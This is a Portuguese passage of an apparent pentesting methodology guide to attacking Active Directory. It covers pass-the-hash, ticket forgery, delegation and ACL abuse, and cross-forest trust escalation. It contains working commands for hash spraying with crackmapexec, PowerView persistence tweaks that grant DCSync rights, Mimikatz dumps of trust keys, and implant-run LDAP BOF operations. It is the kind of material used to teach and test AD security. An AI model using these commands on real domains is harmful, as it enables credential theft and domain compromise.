Agora que você tem algumas credenciais básicas, deve verificar se consegue **encontrar** algum **arquivo interessante compartilhado no AD**. Você pode fazer isso manualmente, mas é uma tarefa muito entediante e repetitiva (ainda mais se encontrar centenas de documentos para verificar).

[**Acesse este link para conhecer ferramentas que você pode usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Roubar Creds NTLM

Se você consegue **acessar outros PCs ou compartilhamentos**, pode **colocar arquivos** (como um arquivo SCF) que, se forem acessados de alguma forma, **dispararão uma autenticação NTLM contra você**, permitindo que você **roube** o **desafio NTLM** para tentar quebrá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Essa vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o controlador de domínio**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalonamento de privilégios no Active Directory COM credenciais/sessão privilegiadas

**Para as técnicas a seguir, um usuário de domínio comum não é suficiente; você precisa de privilégios/credenciais especiais para realizar esses ataques.**

### Extração de hashes

Esperamos que você tenha conseguido **comprometer uma conta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), incluindo relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalonamento local de privilégios](../windows-local-privilege-escalation/index.html).\
Então, é hora de despejar todos os hashes armazenados na memória e localmente.\
[**Leia esta página sobre as diferentes maneiras de obter os hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Depois de obter o hash de um usuário**, você pode usá-lo para **se passar por ele**.\
Você precisa usar alguma **ferramenta** que **realize** a **autenticação NTLM usando** esse **hash**, **ou** pode criar um novo **sessionlogon** e **injetar** esse **hash** no **LSASS**, para que esse **hash seja usado quando qualquer autenticação NTLM for realizada**. Essa última opção é o que o mimikatz faz.\
[**Leia esta página para obter mais informações.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque tem como objetivo **usar o hash NTLM do usuário para solicitar tickets Kerberos**, como alternativa ao uso comum do Pass The Hash pelo protocolo NTLM. Portanto, pode ser especialmente **útil em redes onde o protocolo NTLM está desativado** e apenas **Kerberos é permitido** como protocolo de autenticação.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

No método de ataque **Pass The Ticket (PTT)**, os atacantes **roubam o ticket de autenticação de um usuário**, em vez de suas senhas ou valores de hash. Esse ticket roubado é então usado para **se passar pelo usuário**, obtendo acesso não autorizado a recursos e serviços na rede.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Reutilização de credenciais

Se você tiver o **hash** ou a **senha** de um **administrador local**, tente **fazer login localmente** em outros **PCs** com ele.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Observe que isso é bastante **noisy** e o **LAPS** iria **mitigar** isso.

### Abuso de MSSQL e links confiáveis

Se um usuário tiver privilégios para **acessar instâncias MSSQL**, poderá conseguir **executar comandos** no host MSSQL (se estiver sendo executado como SA), **roubar** o **hash** NetNTLM ou até mesmo realizar um **relay attack**.\
Se uma instância MSSQL for confiável por meio de um link de banco de dados para outra instância, um usuário com privilégios sobre o banco de dados vinculado poderá **usar a relação de confiança para executar consultas na outra instância**. Essas relações de confiança podem ser encadeadas e, eventualmente, chegar a um banco de dados mal configurado no qual o usuário pode executar comandos.\
**Os links entre bancos de dados funcionam até mesmo entre trusts de floresta.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de inventário e implantação de ativos de TI

As ferramentas de terceiros para inventário e implantação frequentemente expõem caminhos poderosos para obter credenciais e executar código. Veja:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se você encontrar qualquer objeto Computer com o atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e tiver privilégios de domínio no computador, poderá extrair da memória os TGTs de todos os usuários que fizerem login nele.\
Assim, se um **Domain Admin fizer login no computador**, você poderá extrair o TGT dele e se passar por ele usando [Pass the Ticket](pass-the-ticket.md).\
Graças à constrained delegation, você poderia até **comprometer automaticamente um Print Server** (esperamos que seja um DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se um usuário ou computador tiver permissão para "Constrained Delegation", poderá **se passar por qualquer usuário para acessar alguns serviços em um computador**.\
Então, se você **comprometer o hash** desse usuário/computador, poderá **se passar por qualquer usuário** (até mesmo Domain Admins) para acessar alguns serviços.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resource-based Constrained Delegation

Ter o privilégio **WRITE** em um objeto do Active Directory de um computador remoto permite obter execução de código com **privilégios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de permissões/ACLs

O usuário comprometido pode ter alguns **privilégios interessantes sobre alguns objetos de domínio** que podem permitir que você faça **movimentação lateral**/**escalada** de privilégios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso do serviço Printer Spooler

Descobrir um **serviço Spool em escuta** no domínio pode ser **abusado** para **obter novas credenciais** e **escalar privilégios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sessões de terceiros

Se **outros usuários** **acessarem** a máquina **comprometida**, é possível **coletar credenciais da memória** e até mesmo **injetar beacons nos processos deles** para se passar por eles.\
Geralmente, os usuários acessam o sistema via RDP. Veja aqui como realizar alguns ataques a sessões RDP de terceiros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

O **LAPS** fornece um sistema para gerenciar a **senha do Administrator local** em computadores associados ao domínio, garantindo que ela seja **aleatória**, exclusiva e **alterada** com frequência. Essas senhas são armazenadas no Active Directory, e o acesso é controlado por ACLs, permitindo-o somente a usuários autorizados. Com permissões suficientes para acessar essas senhas, é possível pivotar para outros computadores.


{{#ref}}
laps.md
{{#endref}}

### Roubo de certificados

Para obter informações sobre inscrição no AD CS, mapeamento de certificados e enumeração antes de tentar roubar certificados ou abusar de templates, consulte a [visão geral de AD Certificates](ad-certificates.md).

**Coletar certificados** da máquina comprometida pode ser uma forma de escalar privilégios no ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de templates de certificados

Se houver **templates vulneráveis** configurados, é possível abusar deles para escalar privilégios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Pós-exploração com conta de privilégios elevados

### Extração de credenciais de domínio

Quando você obtém privilégios de **Domain Admin** ou, melhor ainda, de **Enterprise Admin**, pode **extrair** o **banco de dados do domínio**: _ntds.dit_.

[**Mais informações sobre o ataque DCSync podem ser encontradas aqui**](dcsync.md).

[**Mais informações sobre como roubar o NTDS.dit podem ser encontradas aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Um arquivo de backup legível que contenha `ntds.dit` junto com o hive `SYSTEM` deve ser tratado como material de diretório exposto, mesmo antes da extração. Um hash de senha desatualizado não torna seguros os outros atributos do objeto: campos como `description` podem conter credenciais ou notas operacionais. Primeiro, inspecione os nomes dos membros do arquivo e mantenha o conteúdo extraído do banco de dados fora da saída de enumeração rotineira.

### Privesc como persistência

Algumas das técnicas discutidas anteriormente podem ser usadas para persistência.\
Por exemplo, você poderia:

- Tornar os usuários vulneráveis a [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Tornar os usuários vulneráveis a [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Conceder privilégios de [**DCSync**](#dcsync) a um usuário

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

O **ataque Silver Ticket** cria um **ticket Ticket Granting Service (TGS) legítimo** para um serviço específico usando o **hash NTLM** (por exemplo, o **hash da conta do PC**). Esse método é usado para **acessar os privilégios do serviço**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Um **ataque Golden Ticket** envolve um invasor que obtém acesso ao **hash NTLM da conta krbtgt** em um ambiente Active Directory (AD). Essa conta é especial porque é usada para assinar todos os **Ticket Granting Tickets (TGTs)**, essenciais para a autenticação na rede do AD.

Depois de obter esse hash, o invasor pode criar **TGTs** para qualquer conta que escolher (ataque Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

São como golden tickets forjados de uma forma que **contorna os mecanismos comuns de detecção de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistência de conta com certificados**

**Ter certificados de uma conta ou poder solicitá-los** é uma ótima maneira de manter a persistência na conta de um usuário (mesmo que ele altere a senha):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistência no domínio com certificados**

**Também é possível usar certificados para manter a persistência com privilégios elevados no domínio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupo AdminSDHolder

O objeto **AdminSDHolder** no Active Directory garante a segurança de **grupos privilegiados** (como Domain Admins e Enterprise Admins), aplicando uma **Access Control List (ACL)** padrão a esses grupos para impedir alterações não autorizadas. No entanto, esse recurso pode ser explorado: se um invasor modificar a ACL do AdminSDHolder para conceder acesso total a um usuário comum, esse usuário ganha amplo controle sobre todos os grupos privilegiados. Assim, essa medida de segurança, criada para proteger, pode acabar permitindo acesso indevido se não for monitorada de perto.

[**Mais informações sobre o grupo AdminDSHolder aqui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenciais DSRM

Em todo **Domain Controller (DC)** existe uma conta de **administrador local**. Ao obter direitos de administrador em uma dessas máquinas, é possível extrair o hash do Administrador local usando **mimikatz**. Em seguida, é necessário modificar o registro para **habilitar o uso dessa senha**, permitindo o acesso remoto à conta de Administrador local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistência por ACL

Você pode **conceder** **permissões especiais** a um **usuário** sobre objetos específicos do domínio, permitindo que ele **eleve os privilégios no futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Descritores de segurança

Os **descritores de segurança** são usados para **armazenar** as **permissões** que um **objeto** tem **sobre** outro **objeto**. Se você puder fazer apenas uma **pequena alteração** no **descritor de segurança** de um objeto, poderá obter privilégios muito interessantes sobre ele sem precisar ser membro de um grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Objetos dinâmicos: antiforense / evasão

Abuse da classe auxiliar `dynamicObject` para criar entidades principais/GPOs/registros DNS de curta duração com `entryTTL`/`msDS-Entry-Time-To-Die`; eles se excluem sem tombstones, apagando evidências LDAP e deixando SIDs órfãos, referências `gPLink` inválidas ou respostas DNS em cache (por exemplo, poluição de ACE do AdminSDHolder ou redirecionamentos maliciosos de `gPCFileSysPath`/DNS integrado ao AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Altere o **LSASS** na memória para definir uma **senha universal**, concedendo acesso a todas as contas do domínio.


{{#ref}}
skeleton-key.md
{{#endref}}

### SSP personalizado

[Saiba aqui o que é um SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Você pode criar seu **próprio SSP** para **capturar**, em **texto simples**, as **credenciais** usadas para acessar a máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Ele registra um **novo Domain Controller** no AD e o usa para **enviar atributos** (SIDHistory, SPNs...) a objetos especificados, **sem** deixar **logs** das **modificações**. Você **precisa de privilégios DA** e deve estar dentro do **domínio raiz**.\
Observe que, se você usar dados incorretos, aparecerão logs bem feios.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistência com LAPS

Anteriormente, discutimos como elevar privilégios se você tiver **permissão suficiente para ler senhas do LAPS**. No entanto, essas senhas também podem ser usadas para **manter a persistência**.\
Confira:


{{#ref}}
laps.md
{{#endref}}

## Elevação de privilégios na floresta - relações de confiança entre domínios

A Microsoft considera a **floresta** o limite de segurança. Isso significa que **comprometer um único domínio pode levar ao comprometimento de toda a floresta**.<sup>[[1]](#references)</sup>

### Informações básicas

Uma [**relação de confiança entre domínios**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) é um mecanismo de segurança que permite que um usuário de um **domínio** acesse recursos em outro **domínio**. Ela cria, essencialmente, uma ligação entre os sistemas de autenticação dos dois domínios, permitindo que as verificações de autenticação ocorram sem interrupções. Quando os domínios estabelecem uma relação de confiança, eles trocam e armazenam **chaves** específicas em seus **Domain Controllers (DCs)**, essenciais para a integridade dessa relação.

Em uma situação típica, se um usuário quiser acessar um serviço em um **domínio confiável**, primeiro precisará solicitar um ticket especial, chamado **TGT entre realms**, ao DC do próprio domínio. Esse TGT é criptografado com uma **chave** compartilhada, acordada entre os dois domínios. Em seguida, o usuário apresenta esse TGT ao **DC do domínio confiável** para obter um ticket de serviço (**TGS**). Depois de validar o TGT entre realms, o DC do domínio confiável emite um TGS, concedendo ao usuário acesso ao serviço.

**Etapas**:

1. Um **computador cliente** no **Domínio 1** inicia o processo usando seu **hash NTLM** para solicitar um **Ticket Granting Ticket (TGT)** ao seu **Domain Controller (DC1)**.
2. O DC1 emite um novo TGT se a autenticação do cliente for bem-sucedida.
3. Em seguida, o cliente solicita ao DC1 um **TGT entre realms**, necessário para acessar recursos no **Domínio 2**.
4. O TGT entre realms é criptografado com uma **chave de confiança** compartilhada entre DC1 e DC2 como parte da relação de confiança bidirecional entre os domínios.
5. O cliente leva o TGT entre realms ao **Domain Controller do Domínio 2 (DC2)**.
6. O DC2 verifica o TGT entre realms usando a chave de confiança compartilhada e, se for válido, emite um **Ticket Granting Service (TGS)** para o servidor no Domínio 2 que o cliente deseja acessar.
7. Por fim, o cliente apresenta esse TGS ao servidor, criptografado com o hash da conta do servidor, para obter acesso ao serviço no Domínio 2.

### Diferentes relações de confiança

É importante observar que **uma relação de confiança pode ser unidirecional ou bidirecional**. Nas opções bidirecionais, os dois domínios confiam um no outro; já em uma relação de confiança **unidirecional**, um dos domínios será o **domínio confiável** e o outro, o **domínio que confia**. Nesse último caso, **você só poderá acessar recursos do domínio que confia a partir do domínio confiável**.

Se o Domínio A confia no Domínio B, A é o domínio que confia, e B é o domínio confiável. Além disso, no **Domínio A**, essa seria uma **relação de confiança de saída**; no **Domínio B**, seria uma **relação de confiança de entrada**.

**Diferentes relações de confiança**

- **Relações de confiança pai-filho**: essa é uma configuração comum dentro da mesma floresta, na qual um domínio filho tem automaticamente uma relação de confiança transitiva bidirecional com seu domínio pai. Isso significa que as solicitações de autenticação podem fluir sem interrupções entre o domínio pai e o filho.
- **Relações de confiança entre domínios irmãos**: chamadas de “relações de confiança de atalho”, elas são estabelecidas entre domínios filhos para agilizar os processos de encaminhamento. Em florestas complexas, os encaminhamentos de autenticação normalmente precisam subir até a raiz da floresta e depois descer até o domínio de destino. A criação de relações de confiança entre domínios irmãos encurta esse caminho, o que é especialmente útil em ambientes geograficamente dispersos.
- **Relações de confiança externas**: são configuradas entre domínios diferentes e sem relação entre si, e não são transitivas por natureza. De acordo com a [documentação da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), as relações de confiança externas são úteis para acessar recursos em um domínio fora da floresta atual que não esteja conectado por uma relação de confiança entre florestas. A filtragem de SID reforça a segurança dessas relações.
- **Relações de confiança na raiz da árvore**: são estabelecidas automaticamente entre o domínio raiz da floresta e uma nova raiz de árvore adicionada. Embora não sejam comuns, são importantes para adicionar novas árvores de domínios a uma floresta, permitindo que mantenham um nome de domínio exclusivo e garantindo a transitividade bidirecional. Saiba mais no [guia da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Relações de confiança entre florestas**: esse tipo de relação é bidirecional e transitiva entre os domínios raiz de duas florestas, e também aplica a filtragem de SID para reforçar a segurança.
- **Relações de confiança MIT**: são estabelecidas com domínios Kerberos que não são Windows e são [compatíveis com RFC4120](https://tools.ietf.org/html/rfc4120). Essas relações são mais especializadas e atendem a ambientes que precisam de integração com sistemas baseados em Kerberos fora do ecossistema Windows.

#### Outras diferenças nas **relações de confiança**

- Uma relação de confiança também pode ser **transitiva** (A confia em B, B confia em C e, então, A confia em C) ou **não transitiva**.
- Uma relação de confiança pode ser configurada como **bidirecional** (ambos confiam um no outro) ou **unidirecional** (apenas um deles confia no outro).

### Caminho do ataque

1. **Enumere** as relações de confiança
2. Verifique se algum **principal de segurança** (usuário/grupo/computador) tem **acesso** a recursos do **outro domínio**, talvez por entradas ACE ou por pertencer a grupos do outro domínio. Procure **relações entre domínios** (provavelmente foi para isso que a relação de confiança foi criada).
   1. Fazer kerberoast também pode ser uma opção nesse caso.
3. **Comprometa** as **contas** que podem **pivotar** entre domínios.

Invasores que podem acessar recursos em outro domínio usam três mecanismos principais:

- **Associação a grupos locais**: os principais podem ser adicionados a grupos locais em máquinas, como o grupo “Administradores” em um servidor, o que lhes dá controle significativo sobre essa máquina.
- **Associação a grupos de domínios externos**: os principais também podem ser membros de grupos no domínio externo. No entanto, a eficácia desse método depende da natureza da relação de confiança e do escopo do grupo.
- **Access Control Lists (ACLs)**: os principais podem ser especificados em uma **ACL**, especialmente como entidades em **ACEs** dentro de uma **DACL**, o que lhes concede acesso a recursos específicos. Para saber mais sobre o funcionamento de ACLs, DACLs e ACEs, o whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” é um recurso inestimável.<sup>[[17]](#references)</sup>

### Encontrar usuários/grupos externos com permissões

Você pode verificar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar principais de segurança externos no domínio. Eles serão usuários/grupos de **um domínio/floresta externa**.

Você pode verificar isso no **Bloodhound** ou usando powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Escalação de privilégios de filho para pai na floresta

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Outras maneiras de enumerar relações de confiança entre domínios:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Há **2 chaves de confiança**, uma para _Filho --> Pai_ e outra para _Pai_ --> _Filho_.\
> Você pode obter a usada pelo domínio atual com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escale para Enterprise admin no domínio filho/pai explorando a trust com SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Explorar a Configuration NC gravável

Entender como a Configuration Naming Context (NC) pode ser explorada é crucial. A Configuration NC funciona como um repositório central de dados de configuração em toda a forest nos ambientes do Active Directory (AD). Esses dados são replicados para cada Domain Controller (DC) da forest, e os DCs graváveis mantêm uma cópia gravável da Configuration NC. Para explorar isso, é necessário ter **privilégios SYSTEM em um DC**, de preferência um DC filho.

**Vincular GPO ao site do DC raiz**

O contêiner Sites da Configuration NC inclui informações sobre os sites de todos os computadores ingressados no domínio dentro da forest do AD. Com privilégios SYSTEM em qualquer DC, os atacantes podem vincular GPOs aos sites do DC raiz. Essa ação pode comprometer o domínio raiz ao manipular as políticas aplicadas a esses sites.

Para informações detalhadas, consulte a pesquisa sobre [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Comprometer qualquer gMSA na forest**

Um vetor de ataque consiste em mirar gMSAs privilegiadas no domínio. A KDS Root key, essencial para calcular as senhas das gMSAs, é armazenada na Configuration NC. Com privilégios SYSTEM em qualquer DC, é possível acessar a KDS Root key e calcular as senhas de qualquer gMSA na forest.

Uma análise detalhada e instruções passo a passo estão disponíveis em:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementar de MSA delegada (BadSuccessor – exploração de atributos de migração):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Pesquisa externa adicional: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Ataque de alteração do schema**

Esse método exige paciência: é preciso esperar pela criação de novos objetos privilegiados do AD. Com privilégios SYSTEM, um atacante pode modificar o AD Schema para conceder a qualquer usuário controle total sobre todas as classes. Isso pode levar ao acesso não autorizado e ao controle de objetos do AD recém-criados.

Leia mais sobre [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA a EA com ADCS ESC5**

A vulnerabilidade ADCS ESC5 tem como alvo o controle de objetos da Public Key Infrastructure (PKI) para criar um template de certificado que permite a autenticação como qualquer usuário na forest. Como os objetos PKI residem na Configuration NC, comprometer um DC filho gravável permite executar ataques ESC5.

Mais detalhes estão disponíveis em [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Em cenários sem ADCS, o atacante pode configurar os componentes necessários, conforme explicado em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domínio de forest externa - unidirecional (inbound) ou bidirecional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Neste cenário, **seu domínio é confiável** para um domínio externo, que lhe concede **permissões indeterminadas** sobre ele. Você precisará descobrir **quais principals do seu domínio têm acesso ao domínio externo** e, em seguida, tentar explorá-lo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domínio de floresta externa - unidirecional (de saída)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Neste cenário, **seu domínio** está **confiando** alguns **privilégios** a um principal de **outro domínio**.

No entanto, quando um **domínio é confiado** pelo domínio que confia, o domínio confiado **cria um usuário** com um **nome previsível** que usa como **senha a senha de confiança**. Isso significa que é possível **acessar um usuário do domínio que confia para entrar no domínio confiado**, enumerá-lo e tentar escalar ainda mais os privilégios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Outra forma de comprometer o domínio confiado é encontrar um [**link confiável de SQL**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** à confiança entre os domínios (o que não é muito comum).

Outra forma de comprometer o domínio confiado é esperar em uma máquina à qual um **usuário do domínio confiado possa acessar** para fazer login via **RDP**. Então, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir dali.\
Além disso, se a **vítima tiver montado o disco rígido**, o atacante poderia armazenar **backdoors** na **pasta de inicialização do disco rígido** a partir do processo da **sessão RDP**. Essa técnica é chamada **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação contra abuso de confiança entre domínios

### **SID Filtering:**

- O risco de ataques que exploram o atributo SID history através de trusts entre forests é mitigado pelo SID Filtering, que é ativado por padrão em todos os trusts entre forests. Isso se baseia na suposição de que trusts dentro da mesma forest são seguros, considerando a forest, e não o domínio, como o limite de segurança, de acordo com a posição da Microsoft.
- No entanto, há um porém: o SID Filtering pode interromper aplicações e o acesso de usuários, levando à sua desativação ocasional.

### **Selective Authentication:**

- Para trusts entre forests, usar Selective Authentication garante que usuários das duas forests não sejam autenticados automaticamente. Em vez disso, são necessárias permissões explícitas para que os usuários acessem domínios e servidores dentro do domínio ou forest que confia.
- É importante observar que essas medidas não protegem contra a exploração do writable Configuration Naming Context (NC) ou ataques à conta de trust.

[**Mais informações sobre trusts entre domínios em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abuso de AD baseado em LDAP a partir de implantes no host

A [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplementa primitivas LDAP no estilo bloodyAD como Beacon Object Files x64 que são executados inteiramente dentro de um implante no host (por exemplo, Adaptix C2). Os operadores compilam o pacote com `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, carregam `ldap.axs` e então executam `ldap <subcommand>` a partir do beacon. Todo o tráfego usa o contexto de segurança do logon atual por LDAP (389) com signing/sealing ou LDAPS (636) com confiança automática no certificado, portanto, não são necessários proxies socks nem artefatos em disco.<sup>[[4]](#references)</sup>

### Enumeração LDAP do lado do implante

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` e `get-groupmembers` resolvem nomes curtos/caminhos de OU para DNs completos e extraem os objetos correspondentes.
- `get-object`, `get-attribute` e `get-domaininfo` obtêm atributos arbitrários (incluindo descritores de segurança), além dos metadados da forest/domínio a partir de `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` e `get-rbcd` expõem candidatos a roasting, configurações de delegação e descritores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) diretamente do LDAP.
- `get-acl` e `get-writable --detailed` analisam a DACL para listar trustees, direitos (GenericAll/WriteDACL/WriteOwner/gravações de atributos) e herança, fornecendo alvos imediatos para escalação de privilégios via ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Primitivas de escrita LDAP para escalonamento e persistência

- BOFs de criação de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permitem que o operador prepare novos principals ou contas de máquina em qualquer lugar onde existam permissões na OU. `add-groupmember`, `set-password`, `add-attribute` e `set-attribute` sequestram diretamente os alvos assim que são encontrados direitos de gravação de propriedades.
- Comandos focados em ACL, como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` e `add-dcsync`, convertem WriteDACL/WriteOwner em qualquer objeto do AD em redefinições de senha, controle de associação a grupos ou privilégios de replicação DCSync, sem deixar artefatos de PowerShell/ADSI. Os comandos correspondentes `remove-*` limpam ACEs injetadas.

### Delegação, roasting e abuso de Kerberos

- `add-spn`/`set-spn` tornam imediatamente um usuário comprometido vulnerável a Kerberoast; `add-asreproastable` (alternância de UAC) o marca para AS-REP roasting sem alterar a senha.
- Macros de delegação (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescrevem `msDS-AllowedToDelegateTo`, flags de UAC ou `msDS-AllowedToActOnBehalfOfOtherIdentity` a partir do beacon, permitindo caminhos de ataque de delegação restrita/irrestrita/RBCD e eliminando a necessidade de PowerShell remoto ou RSAT.

### Injeção de sidHistory, realocação de OU e configuração da superfície de ataque

- `add-sidhistory` injeta SIDs privilegiados no histórico de SID de um principal controlado (consulte [Injeção de SID-History](sid-history-injection.md)), proporcionando herança furtiva de acesso totalmente por LDAP/LDAPS.
- `move-object` altera o DN/OU de computadores ou usuários, permitindo que um atacante coloque ativos sob permissões delegadas antes de usar `set-password`, `add-groupmember` ou `add-spn`. Consulte [Realocação de OU e direitos herdados](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) para obter informações sobre permissões de movimentação e verificações de herança.
- Comandos de remoção com escopo restrito (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` etc.) permitem uma reversão rápida após o operador coletar credenciais ou estabelecer persistência, minimizando a telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algumas defesas gerais

[**Saiba mais sobre como proteger credenciais aqui.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para proteção de credenciais**

- **Restrições para Domain Admins**: recomenda-se permitir que Domain Admins façam login somente em Domain Controllers, evitando seu uso em outros hosts.
- **Privilégios de contas de serviço**: os serviços não devem ser executados com privilégios de Domain Admin (DA), para manter a segurança.
